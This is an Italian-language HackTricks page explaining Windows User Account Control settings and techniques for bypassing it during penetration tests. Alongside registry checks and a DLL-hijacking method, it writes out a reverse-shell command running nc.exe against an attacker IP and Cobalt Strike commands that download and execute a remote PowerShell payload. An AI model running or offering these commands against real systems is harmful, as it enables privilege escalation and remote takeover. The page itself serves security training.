# UAC - User Account Control

<details>

<summary><strong>Impara l'hacking su AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare facilmente flussi di lavoro** supportati dagli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) è una funzionalità che abilita una **richiesta di consenso per attività elevate**. Le applicazioni hanno diversi livelli di `integrità`, e un programma con un **livello elevato** può eseguire attività che **potenzialmente potrebbero compromettere il sistema**. Quando UAC è abilitato, le applicazioni e le attività vengono sempre **eseguite nel contesto di sicurezza di un account non amministratore** a meno che un amministratore autorizzi esplicitamente queste applicazioni/attività ad avere accesso di livello amministratore al sistema. È una funzionalità di comodità che protegge gli amministratori da modifiche non intenzionali ma non è considerata un confine di sicurezza.

Per ulteriori informazioni sui livelli di integrità:

{% content-ref url="../windows-local-privilege-escalation/integrity-levels.md" %}
[integrity-levels.md](../windows-local-privilege-escalation/integrity-levels.md)
{% endcontent-ref %}

Quando UAC è attivo, a un utente amministratore vengono forniti 2 token: una chiave utente standard, per eseguire azioni regolari come livello standard, e una con i privilegi di amministratore.

Questa [pagina](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discute approfonditamente il funzionamento di UAC e include il processo di accesso, l'esperienza utente e l'architettura di UAC. Gli amministratori possono utilizzare le policy di sicurezza per configurare come UAC funziona specificamente per la propria organizzazione a livello locale (usando secpol.msc), o configurate e distribuite tramite oggetti di policy di gruppo (GPO) in un ambiente di dominio Active Directory. Le varie impostazioni sono discusse in dettaglio [qui](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Ci sono 10 impostazioni di Group Policy che possono essere impostate per UAC. La tabella seguente fornisce dettagli aggiuntivi:

| Impostazione di Group Policy                                                                                                                                                                                                                                                                                                                                                     | Chiave di Registro          | Impostazione predefinita                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Modalità di approvazione amministrativa per l'account amministratore integrato](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabilitato                                                 |
| [User Account Control: Consentire alle applicazioni UIAccess di richiedere l'elevazione senza utilizzare il desktop sicuro](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabilitato                                                 |
| [User Account Control: Comportamento della richiesta di elevazione per gli amministratori in modalità di approvazione amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Richiedi il consenso per i binari non Windows                  |
| [User Account Control: Comportamento della richiesta di elevazione per gli utenti standard](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Richiedi le credenziali sul desktop sicuro                    |
| [User Account Control: Rilevare le installazioni delle applicazioni e richiedere l'elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Abilitato (predefinito per home) Disabilitato (predefinito per enterprise) |
| [User Account Control: Elevare solo eseguibili firmati e convalidati](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabilitato                                                 |
| [User Account Control: Elevare solo applicazioni UIAccess installate in posizioni sicure](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Abilitato                                                     |
| [User Account Control: Eseguire tutti gli amministratori in modalità di approvazione amministrativa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Abilitato                                                     |
| [User Account Control: Passare al desktop sicuro durante la richiesta di elevazione](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Abilitato                                                     |
| [User Account Control: Virtualizzare errori di scrittura di file e registro in posizioni per utente](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Abilitato                                                     |
### Teoria del Bypass di UAC

Alcuni programmi vengono **autoelevati automaticamente** se l'**utente appartiene** al **gruppo amministratori**. Questi binari hanno all'interno dei loro _**Manifesti**_ l'opzione _**autoElevate**_ con valore _**True**_. Il binario deve essere **firmato da Microsoft** anche.

Quindi, per **bypassare** l'**UAC** (elevare da un livello di integrità **medio** a **alto**) alcuni attaccanti utilizzano questo tipo di binari per **eseguire codice arbitrario** perché verrà eseguito da un **processo ad alto livello di integrità**.

È possibile **verificare** il _**Manifesto**_ di un binario utilizzando lo strumento _**sigcheck.exe**_ di Sysinternals. E puoi **vedere** il **livello di integrità** dei processi utilizzando _Process Explorer_ o _Process Monitor_ (di Sysinternals).

### Verifica UAC

Per confermare se UAC è abilitato, eseguire:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Se è **`1`** allora UAC è **attivato**, se è **`0`** o **non esiste**, allora UAC è **inattivo**.

Quindi, controlla **quale livello** è configurato:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
* Se **`0`** allora, UAC non chiederà conferma (come **disabilitato**)
* Se **`1`** all'amministratore viene **richiesto username e password** per eseguire il binario con privilegi elevati (su Secure Desktop)
* Se **`2`** (**Notificami sempre**) UAC chiederà sempre conferma all'amministratore quando cerca di eseguire qualcosa con privilegi elevati (su Secure Desktop)
* Se **`3`** come `1` ma non necessario su Secure Desktop
* Se **`4`** come `2` ma non necessario su Secure Desktop
* Se **`5`** (**predefinito**) chiederà all'amministratore di confermare l'esecuzione di binari non Windows con privilegi elevati

Successivamente, è necessario controllare il valore di **`LocalAccountTokenFilterPolicy`**\
Se il valore è **`0`**, solo l'utente **RID 500** (**Amministratore integrato**) può eseguire **attività da amministratore senza UAC**, se è `1`, **tutti gli account nel gruppo "Amministratori"** possono farlo.

Infine, controllare il valore della chiave **`FilterAdministratorToken`**\
Se **`0`**(predefinito), l'**account Amministratore integrato può** eseguire attività di amministrazione remota e se **`1`** l'account integrato Amministratore **non può** eseguire attività di amministrazione remota, a meno che `LocalAccountTokenFilterPolicy` sia impostato su `1`.

#### Riassunto

* Se `EnableLUA=0` o **non esiste**, **nessun UAC per nessuno**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=1` , Nessun UAC per nessuno**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=0`, Nessun UAC per RID 500 (Amministratore integrato)**
* Se `EnableLua=1` e **`LocalAccountTokenFilterPolicy=0` e `FilterAdministratorToken=1`, UAC per tutti**

Tutte queste informazioni possono essere ottenute utilizzando il modulo **metasploit**: `post/windows/gather/win_privs`

È anche possibile controllare i gruppi del tuo utente e ottenere il livello di integrità:
```
net user %username%
whoami /groups | findstr Level
```
## Bypass UAC

{% hint style="info" %}
Si noti che se si ha accesso grafico alla vittima, il bypass di UAC è semplice in quanto è sufficiente fare clic su "Sì" quando compare il prompt UAC.
{% endhint %}

Il bypass di UAC è necessario nella seguente situazione: **UAC è attivato, il tuo processo è in esecuzione in un contesto di integrità media e il tuo utente appartiene al gruppo degli amministratori**.

È importante sottolineare che è **molto più difficile aggirare UAC se è impostato al livello di sicurezza più alto (Sempre) rispetto a uno qualsiasi degli altri livelli (Predefinito).**

### UAC disabilitato

Se UAC è già disabilitato (`ConsentPromptBehaviorAdmin` è **`0`**) è possibile **eseguire una shell inversa con privilegi di amministratore** (livello di integrità elevato) utilizzando qualcosa del genere:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### Bypass UAC con duplicazione del token

* [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
* [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Molto** semplice "bypass" UAC (accesso completo al file system)

Se hai una shell con un utente che è all'interno del gruppo Amministratori, puoi **montare il C$** condiviso tramite SMB (file system) localmente in un nuovo disco e avrai **accesso a tutto all'interno del file system** (anche la cartella home dell'Amministratore).

{% hint style="warning" %}
**Sembra che questo trucco non funzioni più**
{% endhint %}
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### Bypass UAC con cobalt strike

Le tecniche di Cobalt Strike funzioneranno solo se UAC non è impostato al massimo livello di sicurezza
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** e **Metasploit** hanno diversi moduli per **bypassare** il **UAC**.

### KRBUACBypass

Documentazione e strumento su [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploit di bypass UAC

[**UACME**](https://github.com/hfiref0x/UACME) è una **compilazione** di diversi exploit di bypass UAC. Nota che dovrai **compilare UACME usando visual studio o msbuild**. La compilazione creerà diversi eseguibili (come `Source\Akagi\outout\x64\Debug\Akagi.exe`), dovrai sapere **quale ti serve.**\
Dovresti **fare attenzione** perché alcuni bypass faranno **comparire altri programmi** che **avviseranno** l'**utente** che sta succedendo qualcosa.

UACME ha la **versione di build da cui ogni tecnica ha iniziato a funzionare**. Puoi cercare una tecnica che influisce sulle tue versioni:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Inoltre, utilizzando [questa](https://en.wikipedia.org/wiki/Windows\_10\_version\_history) pagina puoi ottenere il rilascio di Windows `1607` dalle versioni di build.

#### Ulteriori bypass di UAC

**Tutte** le tecniche utilizzate qui per bypassare UAC **richiedono** una **shell interattiva completa** con la vittima (una shell nc.exe comune non è sufficiente).

Puoi ottenerla utilizzando una sessione **meterpreter**. Migrare verso un **processo** che ha il valore **Sessione** uguale a **1**:

![](<../../.gitbook/assets/image (96).png>)

(_explorer.exe_ dovrebbe funzionare)

### Bypass di UAC con GUI

Se hai accesso a una **GUI puoi semplicemente accettare il prompt UAC** quando lo ricevi, non hai davvero bisogno di un bypass. Quindi, ottenere l'accesso a una GUI ti permetterà di bypassare l'UAC.

Inoltre, se ottieni una sessione GUI che qualcuno stava utilizzando (potenzialmente tramite RDP) ci sono **alcuni strumenti che verranno eseguiti come amministratore** da cui potresti **eseguire** ad esempio un **cmd** come amministratore direttamente senza essere nuovamente sollecitato da UAC come [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Questo potrebbe essere un po' più **furtivo**.

### Bypass di UAC rumoroso con forza bruta

Se non ti interessa essere rumoroso, potresti sempre **eseguire qualcosa come** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) che **chiede di elevare i permessi finché l'utente non li accetta**.

### Il tuo bypass - Metodologia di base per il bypass di UAC

Se dai un'occhiata a **UACME** noterai che **la maggior parte dei bypass di UAC sfruttano una vulnerabilità di Dll Hijacking** (principalmente scrivendo il dll dannoso su _C:\Windows\System32_). [Leggi questo per imparare come trovare una vulnerabilità di Dll Hijacking](../windows-local-privilege-escalation/dll-hijacking.md).

1. Trova un binario che si **autoeleva** (controlla che quando viene eseguito funzioni con un livello di integrità elevato).
2. Con procmon trova eventi "**NOME NON TROVATO**" che potrebbero essere vulnerabili al **Dll Hijacking**.
3. Probabilmente dovrai **scrivere** il DLL all'interno di alcuni **percorsi protetti** (come C:\Windows\System32) dove non hai permessi di scrittura. Puoi aggirare questo utilizzando:
1. **wusa.exe**: Windows 7, 8 e 8.1. Consente di estrarre il contenuto di un file CAB all'interno di percorsi protetti (perché questo strumento viene eseguito da un livello di integrità elevato).
2. **IFileOperation**: Windows 10.
4. Prepara uno **script** per copiare il tuo DLL all'interno del percorso protetto ed eseguire il binario vulnerabile e autoelevato.

### Un'altra tecnica di bypass di UAC

Consiste nel verificare se un **binario autoelevato** cerca di **leggere** dal **registro** il **nome/percorso** di un **binario** o **comando** da **eseguire** (questo è più interessante se il binario cerca queste informazioni all'interno di **HKCU**).

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e **automatizzare flussi di lavoro** con gli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusivi [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
